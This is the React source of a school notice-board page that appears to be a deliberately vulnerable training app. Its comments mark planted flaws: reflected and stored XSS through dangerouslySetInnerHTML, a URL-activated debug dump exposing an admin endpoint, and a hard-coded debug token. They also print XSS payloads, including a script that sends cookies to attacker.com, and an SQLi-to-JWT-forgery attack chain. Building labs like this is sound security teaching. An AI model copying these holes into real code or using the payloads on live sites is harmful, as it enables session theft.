"use client";

// TODO: remove debug mode before prod — rverma 12/04
// DEBUG_KEY = "showAll=true" — append to URL to see hidden notices
// Internal API dump: /api/notices?debug=1&token=campuscare_debug_2025

import { useEffect, useState } from "react";
import Navbar from "@/components/Navbar";

interface Notice {
  id: number;
  title: string;
  content: string;
  author: string;
  created_at: string;
}

export default function NoticesPage() {
  const [notices, setNotices]       = useState<Notice[]>([]);
  const [filter, setFilter]         = useState("");
  const [loading, setLoading]       = useState(true);
  const [expandedId, setExpandedId] = useState<number | null>(null);
  // VULNERABILITY: debug flag read directly from URL — ?debug=true exposes raw API dump
  const [debugMode, setDebugMode]   = useState(false);
  const [rawApiDump, setRawApiDump] = useState<any>(null);

  useEffect(() => {
    // VULNERABILITY: client-side URL param enables debug features
    // visiting /notices?debug=true or /notices?showAll=true activates it
    const params = new URLSearchParams(window.location.search);
    const isDebug = params.get("debug") === "true" || params.get("showAll") === "true";
    setDebugMode(isDebug);

    fetch("/api/notices")
      .then(r => r.json())
      .then(d => {
        setNotices(d.notices || []);
        // VULNERABILITY: entire raw API response stored and rendered in debug mode
        // exposes internal object structure, field names, and notice count
        setRawApiDump(d);
        setLoading(false);
      });
  }, []);

  // VULNERABILITY: highlight function injects filter string raw into innerHTML
  // search input is not HTML-encoded before being inserted into the DOM
  // payload: <img src=x onerror="alert(document.cookie)"> fires on every notice render
  const highlightMatch = (text: string, query: string): string => {
    if (!query.trim()) return text;
    // intentionally NOT escaping query before building regex or injecting into HTML
    const escaped = query.replace(/[.*+?^${}()|[\]\\]/g, "");
    return text.replace(
      new RegExp(`(${escaped})`, "gi"),
      `<mark style="background:rgba(6,182,212,0.25);color:#67e8f9;border-radius:2px;padding:0 2px">$1</mark>`
    );
  };

  const filtered = notices.filter(n =>
    !filter ||
    [n.title, n.content, n.author].some(field =>
      field.toLowerCase().includes(filter.toLowerCase())
    )
  );

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-slate-200">
      <Navbar />

      <main className="max-w-4xl mx-auto px-6 py-12">

        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-4">
          <div>
            <h1 className="text-3xl font-black text-white tracking-tight">Notice Board</h1>
            <p className="text-slate-500 text-sm mt-1">Greenfield International • Central Bulletin</p>
          </div>
          <div className="flex items-center gap-3 bg-emerald-500/5 border border-emerald-500/20 px-3 py-1.5 rounded-full">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500" />
            </span>
            <span className="text-[10px] font-bold text-emerald-500 uppercase tracking-widest">Live Feed</span>
          </div>
        </header>

        {/* VULNERABILITY: Debug panel — activated via ?debug=true in the URL
            Dumps the raw API response object to screen including:
            - all field names returned by the API
            - total notice count
            - link to the admin notices endpoint
            Attack: visit /notices?debug=true to see the full API response structure */}
        {debugMode && rawApiDump && (
          <div style={{
            background: "#0a1a0a",
            border: "1px solid rgba(34,197,94,0.3)",
            borderRadius: 8, padding: 16, marginBottom: 24,
            fontFamily: "monospace",
          }}>
            <div style={{ fontSize: 11, color: "#4ade80", marginBottom: 8, textTransform: "uppercase", letterSpacing: 1 }}>
              ⚠ Debug Mode Active — Raw API Response
            </div>
            <pre style={{ fontSize: 11, color: "#86efac", overflowX: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
              {JSON.stringify(rawApiDump, null, 2)}
            </pre>
            <div style={{ fontSize: 10, color: "#4ade80", marginTop: 10, opacity: 0.7 }}>
              {/* VULNERABILITY: directly reveals admin endpoint in debug output */}
              Admin view available at:{" "}
              <a href="/api/admin/notices" style={{ color: "#4ade80", textDecoration: "underline" }}>
                /api/admin/notices
              </a>{" "}
              (requires role: admin in JWT)
            </div>
          </div>
        )}

        {/* Filter Bar */}
        <div className="relative mb-2 group">
          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 group-focus-within:text-cyan-400 transition-colors">
            🔍
          </span>
          <input
            type="text"
            value={filter}
            onChange={e => setFilter(e.target.value)}
            placeholder="Search bulletin keywords..."
            className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-12 text-sm font-mono focus:outline-none focus:border-cyan-500/40 transition-all placeholder:text-slate-600"
          />
          {filter && (
            <button
              onClick={() => setFilter("")}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white text-xl"
            >
              &times;
            </button>
          )}
        </div>

        {/* VULNERABILITY: Reflected XSS — filter value injected raw into DOM via dangerouslySetInnerHTML
            Renders ALWAYS even when no notices match — XSS fires immediately on any input.
            Attack: type  <img src=x onerror=alert(document.cookie)>  in the search box */}
        {filter && (
          <div className="mb-6 px-1">
            <p
              className="text-[11px] font-mono text-slate-600"
              dangerouslySetInnerHTML={{
                __html: `Searching bulletins for: <span style="color:#67e8f9">${filter}</span>`
              }}
            />
          </div>
        )}

        {/* Notice Feed */}
        <div className="space-y-3">
          {loading ? (
            <LoadingSkeletons />
          ) : filtered.length === 0 ? (
            <EmptyState isFiltered={!!filter} onClear={() => setFilter("")} />
          ) : (
            filtered.map(n => (
              <NoticeCard
                key={n.id}
                notice={n}
                isExpanded={expandedId === n.id}
                onToggle={() => setExpandedId(expandedId === n.id ? null : n.id)}
                highlight={filter}
                highlightFn={highlightMatch}
              />
            ))
          )}
        </div>

        {/* Footer */}
        {!loading && (
          <footer className="mt-12 pt-6 border-t border-white/5 flex justify-between items-center text-[10px] text-slate-600 font-mono uppercase tracking-widest">
            <span>Payload: {filtered.length} Objects</span>
            <span>Sync: {new Date().toLocaleTimeString()}</span>
            {/* VULNERABILITY: [sys] link visible in page source — hints at debug mode
                colour matches background so visually hidden but present in DOM */}
            {!debugMode && (
              <a
                href="?debug=true"
                style={{ color: "#111", fontSize: 10, textDecoration: "none" }}
                title="sys"
              >
                [sys]
              </a>
            )}
          </footer>
        )}
      </main>
    </div>
  );
}

// ── Sub-components ───────────────────────────────────────────────────────────

function NoticeCard({
  notice, isExpanded, onToggle, highlight, highlightFn,
}: {
  notice: Notice;
  isExpanded: boolean;
  onToggle: () => void;
  highlight: string;
  highlightFn: (text: string, query: string) => string;
}) {
  const isNew = (Date.now() - new Date(notice.created_at).getTime()) < 86400000 * 3;

  const getAccent = (author: string) => {
    if (author === "admin")     return "bg-red-500";
    if (author === "principal") return "bg-yellow-500";
    return "bg-cyan-500";
  };

  return (
    <div className={`
      group border rounded-2xl transition-all duration-300
      ${isExpanded
        ? "bg-white/[0.04] border-cyan-500/40"
        : "bg-white/[0.02] border-white/10 hover:border-white/20"}
    `}>
      <button
        onClick={onToggle}
        className="w-full text-left p-5 flex items-start gap-4"
      >
        <div className={`w-1 self-stretch rounded-full ${getAccent(notice.author)} opacity-60 mt-1`} />

        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-3 mb-1">
            {/* VULNERABILITY: Reflected XSS via dangerouslySetInnerHTML
                The highlight function injects the raw search input into the DOM as HTML
                Attack: type this in the search box:
                <img src=x onerror=alert(document.cookie)>
                The onerror fires on every matching notice title render */}
            <h3
              className="font-bold text-slate-200 truncate group-hover:text-white transition-colors"
              dangerouslySetInnerHTML={{ __html: highlightFn(notice.title, highlight) }}
            />
            {isNew && (
              <span className="text-[9px] font-black bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 px-1.5 py-0.5 rounded uppercase">
                New
              </span>
            )}
          </div>

          <div className="flex items-center gap-3 text-[10px] font-mono text-slate-500 uppercase tracking-tighter">
            {/* VULNERABILITY: Stored XSS surface — author field rendered as raw HTML
                If an attacker can control the author field (e.g. via forged admin JWT
                posting a notice), any HTML in the author name executes here
                Attack: POST /api/admin/notices with author containing <script>...</script> */}
            <span
              className="text-slate-400"
              dangerouslySetInnerHTML={{ __html: notice.author }}
            />
            <span>•</span>
            <span>{new Date(notice.created_at).toLocaleDateString()}</span>
          </div>
        </div>

        <span className={`text-slate-600 transition-transform duration-300 ${isExpanded ? "rotate-180" : ""}`}>
          ▼
        </span>
      </button>

      {isExpanded && (
        <div className="px-10 pb-6 animate-in fade-in slide-in-from-top-2 duration-300">
          <div className="h-px bg-white/10 mb-5" />
          {/* VULNERABILITY: Stored XSS — notice content rendered as raw HTML
              An admin (or attacker with forged admin JWT) can POST a notice with:
              content: "<script>document.location='https://attacker.com?c='+document.cookie</script>"
              This executes for every user who expands that notice
              Combined attack: SQLi login → JWT forge → POST malicious notice → steal all session cookies */}
          <p
            className="text-slate-400 text-sm leading-relaxed font-sans"
            dangerouslySetInnerHTML={{ __html: highlightFn(notice.content, highlight) }}
          />
        </div>
      )}
    </div>
  );
}

function LoadingSkeletons() {
  return (
    <div className="space-y-3 opacity-20">
      {[1, 2, 3, 4].map(i => (
        <div key={i} className="h-20 bg-white/10 rounded-2xl animate-pulse" />
      ))}
    </div>
  );
}

function EmptyState({ isFiltered, onClear }: { isFiltered: boolean; onClear: () => void }) {
  return (
    <div className="text-center py-20 bg-white/[0.02] border border-dashed border-white/10 rounded-3xl">
      <div className="text-4xl mb-4 grayscale opacity-50">📑</div>
      <p className="text-slate-400 text-sm">No bulletins match your current filter.</p>
      {isFiltered && (
        <button onClick={onClear} className="mt-4 text-xs text-cyan-500 hover:underline">
          Clear Search Filter
        </button>
      )}
    </div>
  );
}